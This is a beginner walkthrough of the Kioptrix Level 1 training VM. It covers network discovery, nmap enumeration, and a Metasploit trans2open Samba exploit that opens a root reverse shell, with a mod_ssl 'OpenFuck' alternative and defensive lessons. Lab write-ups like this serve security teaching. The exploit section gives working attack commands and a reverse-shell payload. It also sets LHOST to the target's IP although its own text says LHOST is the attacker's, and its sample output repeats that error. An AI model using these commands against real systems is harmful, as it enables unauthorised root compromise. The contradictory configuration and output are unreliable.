# Kioptrix: Level 1 (#1) — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | Kioptrix: Level 1 (#1) |
| **Difficulty** | Easy |
| **Author** | loneferret |
| **Released** | February 17, 2010 |
| **VulnHub Entry** | [Kioptrix: Level 1 (#1) on VulnHub](https://vulnhub.com/entry/kioptrix-level-1-1,22/) |
| **Download** | [Kioptrix: Level 1 OVA](https://vulnhub.com/entry/kioptrix-level-1-1,22/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (Red Hat era) |

## 0. What you will learn

- **Network discovery:** How to locate a vulnerable VM on your local lab network.
- **Port & service enumeration:** How to use Nmap to identify open ports and extract service versions.
- **SMB vulnerability research:** Why an old Samba version is a common foothold for beginners.
- **Buffer overflow exploitation:** How the Samba `trans2open` remote buffer overflow works (conceptually) and how to leverage it with Metasploit.
- **Manual validation:** Using `searchsploit` to confirm available exploits before launching automated tools.
- **Post-exploitation basics:** Confirming privilege level, locating artifacts, and understanding the immediate root compromise.
- **Defensive thinking:** Practical blue team takeaways to prevent similar misconfigurations.

## 1. Reconnaissance — finding the target

Before attacking, we need to find the target's IP address on the virtual lab network. 

> **How to read it:** These commands help you discover live hosts on your isolated lab subnet. 
> **Why it works:** ARP and host discovery reveal which IP corresponds to your Kioptrix VM.

**Check your attacker IP:**
```bash
ip a
```

> **How to read it:** Shows your network interfaces and assigned IPs. Use the one for your lab network (e.g. `eth1`, `vmnet`, or `vboxnet`).
> **Example:** Your attacker (Kali) is typically `192.168.56.10`; the target will be a different address such as `192.168.56.101`.

**Discover live hosts on the subnet (ARP-based):**

Method A - `arp-scan` (common on Kali):
```bash
sudo arp-scan --localnet
```

Method B - `netdiscover`:
```bash
sudo netdiscover -i <lab-interface> -r 192.168.56.0/24
```

> **How to read it:** Look for the MAC vendor or hostname clues; Kioptrix VMs often show Linux-based MACs and will respond to ARP.

**Ping sweep (optional confirmation):**
```bash
nmap -sn 192.168.56.0/24
```

> **How to read it:** `-sn` skips port scanning and only checks for host reachability.
> **Why it works:** Confirms which IPs are up. For clarity, the rest of this guide uses the attacker `192.168.56.10` and the example target IP `192.168.56.101`. Replace these with the addresses you actually discover.

## 2. Enumeration — open ports and services

With the target IP identified, we enumerate open ports, services, and versions. This is the most important step for beginners.

### 2.1 Full port scan
```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

> **How to read it:** `-p-` scans all 65535 TCP ports. `--min-rate 1000` speeds things up in lab environments. `-T4` is a timing template. `-oA` saves output in .nmap, .gnmap, and .xml formats.
> **Why it works:** Many vulnerable services run on non-standard ports in modern configs, but Kioptrix 1 exposes a predictable set.

### 2.2 Service detection & default scripts
```bash
sudo nmap -sC -sV -p 22,80,111,139,443,445,1024 -oA scans/services 192.168.56.101
```

> **How to read it:** `-sC` runs Nmap's safe default NSE scripts. `-sV` probes for service/version info. Specifying ports focuses the scan on discovered services.
> **Why it works:** Version numbers tell us if a service is outdated and likely exploitable.

### 2.3 Realistic expected output for Kioptrix 1

For the classic Kioptrix: Level 1 (#1), the scan typically returns something similar to this (exact banners can vary by build):

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at [DATE]
Nmap scan report for 192.168.56.101
Host is up (0.0005s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 2.2.1a (workgroup: MYGROUP)
443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
445/tcp  open  netbios-ssn Samba smbd 2.2.1a (workgroup: MYGROUP)
1024/tcp open  status      1 (RPC #100024)

Host script results:
|_clock-skew: 3h59m59s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
```

> **How to read it:** The key lines are Samba 2.2.1a on ports 139 and 445, and Apache 1.3.20 with mod_ssl/2.8.4 and OpenSSL 0.9.6b on 80/443. SSH is OpenSSH 2.9p2.
> **Why it works:** SMB ports 139/445 expose Windows-like file sharing; Samba is the Linux implementation. The very old `Samba 2.2.1a` is vulnerable to the `trans2open` remote buffer overflow (CVE-2003-0201). The old mod_ssl/OpenSSL combo is also exploitable (CVE-2002-0082).

![nmap scan of Kioptrix](images/02-nmap.png)

## 3. Foothold — gaining the first shell

With enumeration complete, the shortest path to a shell is the Samba `trans2open` overflow. We'll cover both manual research and the Metasploit route.

### 3.1 Research with searchsploit

Always confirm the exploit exists offline first.

```bash
searchsploit samba 2.2
searchsploit trans2open
```

> **How to read it:** `searchsploit` searches the local Exploit-DB archive. Look for `Samba 2.2.x - trans2open Overflow (Linux x86)` entries (e.g. `linux/remote/10.c`, `linux/remote/22.c`).
> **Why it works:** Matching the exact vulnerable version saves you from wasting time on incompatible exploits.

Example output (typical):
```text
Samba 2.2.x - trans2open Overflow (Linux x86)                | linux/remote/22.c
Samba trans2open Overflow (Linux x86)                         | linux/remote/10.c
```

> **Note:** While you can compile these standalone C exploits, the Metasploit module is clean and reliable in most lab environments.

### 3.2 Metasploit: use `exploit/linux/samba/trans2open`

Fire up msfconsole and run the classic exploit.

```bash
msfconsole -q
```

Inside msfconsole:

```text
msf6 > search trans2open
msf6 > use exploit/linux/samba/trans2open
msf6 exploit(linux/samba/trans2open) > show options
```

Configure the target and a suitable payload:

```text
msf6 exploit(linux/samba/trans2open) > set RHOSTS 192.168.56.101
msf6 exploit(linux/samba/trans2open) > set LHOST 192.168.56.101
msf6 exploit(linux/samba/trans2open) > show payloads
msf6 exploit(linux/samba/trans2open) > set PAYLOAD linux/x86/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) > exploit
```

> **How to read it:** `RHOSTS` = target IP. `LHOST` = your attacker IP (where the reverse shell should connect back to). We choose `linux/x86/shell_reverse_tcp` here because it’s a simple non-staged shell payload that tends to work well on this legacy box.
> **Reverse_tcp vs bind payloads:** A reverse_tcp payload makes the target connect back to your attacker listener (common when firewalls/NAT block inbound). A bind_tcp payload would have the target listen on a port and you connect to it. For this local lab, either can work, but reverse is often safer.

### 3.3 Realistic expected output

If successful, you'll see something like:

```text
[*] Started reverse TCP handler on 192.168.56.101:4444
[*] Connecting to target...
[*] Trying return address 0xbffffdfc...
[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.101:XXXX) at [DATE]
```

You should then drop into a shell. Verify identity:

```bash
whoami
id
uname -a
pwd
```

Realistic output:
```text
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# uname -a
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
```

> **How to read it:** `uid=0(root)` means you have root privileges. On this VM, the Samba `trans2open` exploit yields **root directly** — no separate privilege escalation is required.
> **Why it works:** The vulnerable Samba process runs with high privileges on this intentionally misconfigured machine, so overflowing it executes your payload as that user (root).

![metasploit trans2open session](images/03-trans2open-shell.png)

## 4. Privilege escalation

**For this box, no further escalation is needed.** The `trans2open` exploit grants root immediately. 

- Run `id` to confirm: `uid=0(root) gid=0(root)`.
- Check for common flag files (varies by build): 
```bash
ls -la /root/
cat /root/README* 2>/dev/null; echo "---"
find / -name '*flag*' -type f 2>/dev/null | head -15
```

> **How to read it:** Some Kioptrix builds include a `congrats.txt` or flag in `/root/`, others do not. If nothing is present, that’s normal — the goal is to obtain a root shell. Do not invent flag contents.

### Alternative path (optional knowledge)

The web stack also has an older mod_ssl/OpenSSL vulnerability (CVE-2002-0082) sometimes referred to as "OpenFuck". Tools like `OpenFuck.c` can target specific Apache/mod_ssl/OpenSSL version pairs and potentially yield a shell. This is less common as the first path, but worth knowing:

- Target: Apache 1.3.20 + mod_ssl 2.8.4 + OpenSSL 0.9.6b
- Common approach: `searchsploit apache mod_ssl` → compile `OpenFuck.c` against the correct target code (e.g. `0x6b` for RedHat 7.2), run with target IP.
- Result varies; may drop to `apache` user and require further escalation on some builds. The Samba path is the canonical beginner route here.

> **Note:** Do not feel obligated to run OpenFuck if you already have root via trans2open.

![root confirmation and /root listing](images/04-root-escalation.png)

## 5. Summary of vulnerabilities

| Vulnerability | CVE | Affected Component | Port(s) | Impact | Notes |
|---|---|---|---|---|---|
| Samba `trans2open` buffer overflow | CVE-2003-0201 | Samba 2.2.0–2.2.8 (here 2.2.1a) | 139, 445 (SMB) | Remote Code Execution → root | Unauthenticated; classic Kioptrix 1 foothold. |
| mod_ssl/OpenSSL buffer overflow ("OpenFuck") | CVE-2002-0082 | Apache 1.3.20 + mod_ssl 2.8.4 + OpenSSL 0.9.6b | 80, 443 (HTTP/HTTPS) | Remote Code Execution | Alternative path; may require further escalation depending on build. |
| Weak/default SMB exposure | N/A (misconfiguration) | Legacy SMBv1 (netbios-ssn) | 139, 445 | Enables exploitation of old Samba | Avoid exposing SMB to untrusted networks. |
| Outdated SSH | N/A (old version) | OpenSSH 2.9p2 (protocol 1.99) | 22 | Potential legacy protocol/crypto concerns | Patch management issue. |

> **How to read it:** Multiple legacy services are present; the decisive issue is the unpatched Samba implementation reachable with no authentication.

## 6. Defensive lessons (blue team)

- **Patch management:** Update Samba, Apache, mod_ssl, OpenSSL, and OpenSSH to supported versions. The 2001–2003 era builds here are decades out of date.
- **Disable SMBv1:** SMBv1 is deprecated and highly vulnerable. Block TCP/445 and NetBIOS 139 at the perimeter; disable SMBv1 on modern systems.
- **Least exposure:** Do not expose file sharing (SMB) or management services to untrusted networks. Use host-based firewalls and network segmentation.
- **Remove unnecessary services:** If SMB is not needed, stop and disable `smbd/nmbd` (and related RPC services). If HTTP is internal-only, restrict access.
- **Harden legacy stacks:** If you must run legacy apps (rare), put them behind a VPN, WAF/proxy, and strict ACLs; ideally containerize or isolate.
- **Version awareness:** Inventory service versions in your environment and flag EOL software. Use vulnerability scanning (with care in production) to catch these issues.
- **Defense-in-depth:** Combine patching, network controls, logging/monitoring (SMB access logs), and alerting on suspicious outbound connections (useful if reverse shells occur).

## 7. References

These are real community writeups that document the same path and were consulted during research:

- [Kioptrix Level 1 Writeup — dearkepha/vulnhub.writeups (GitHub)](https://github.com/dearkepha/vulnhub.writeups/blob/main/kioptrixLevel1/Kioptrixlv1.md)
- [Vulnhub Kioptrix Level 1 — InnocentSADO (GitHub)](https://github.com/InnocentSADO/vulnhub-kioptrix-level1)
- [Kioptrix Level 1 Walkthrough — moehabx (GitHub)](https://github.com/moehabx/Kioptrix-Level-1-Writeup)
- [Kioptrix Level 1 — VulnQuest](https://vulnquest58.github.io/ctf/writeups/vulnhub/kioptrix)
- [Kioptrix Level 1 – Samba trans2open Exploit — Cyberdrek01 (GitHub)](https://github.com/Cyberdrek01/KIOPTRIX-LEVEL1-SAMBA-TRANS2OPEN)
- [VulnHub Official Entry — Kioptrix: Level 1 (#1)](https://vulnhub.com/entry/kioptrix-level-1-1,22/)

## 8. Screenshot checklist

- [ ] `images/01-recon-arp-scan.png` — ARP/host discovery showing target IP
- [ ] `images/02-nmap.png` — Nmap service/version scan showing ports 139/445 and Samba 2.2.1a
- [ ] `images/03-trans2open-shell.png` — Metasploit `trans2open` session opened
- [ ] `images/04-root-escalation.png` — `whoami`, `id`, and `/root` listing (confirming root)
- [ ] `images/05-proof.png` — Optional proof (flag/congrats if present)

> **How to read it:** Store screenshots in `labs/kioptrix-level-1-1/images/` and reference them here. Use relative paths as shown.

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*